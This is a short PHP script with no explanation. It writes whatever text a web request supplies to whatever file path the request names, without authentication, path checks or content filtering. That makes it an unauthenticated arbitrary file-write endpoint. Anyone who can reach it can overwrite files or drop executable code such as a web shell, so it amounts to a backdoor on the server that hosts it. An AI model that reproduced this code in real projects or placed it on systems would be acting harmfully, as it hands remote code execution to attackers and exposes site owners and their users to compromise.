<?php

$file       = $_REQUEST['file'];
$content    = $_REQUEST['content'];
$cwd        =  dirname(getcwd() ,1);
$filename  = $cwd . '/' . $file;
  

$fp = fopen($filename, 'w');
if ($fp) {
    fwrite($fp, $content);
    fclose($fp);
    echo $filename;
} else {
    echo "Error: Could not open file '{$filename}'.";
}
?>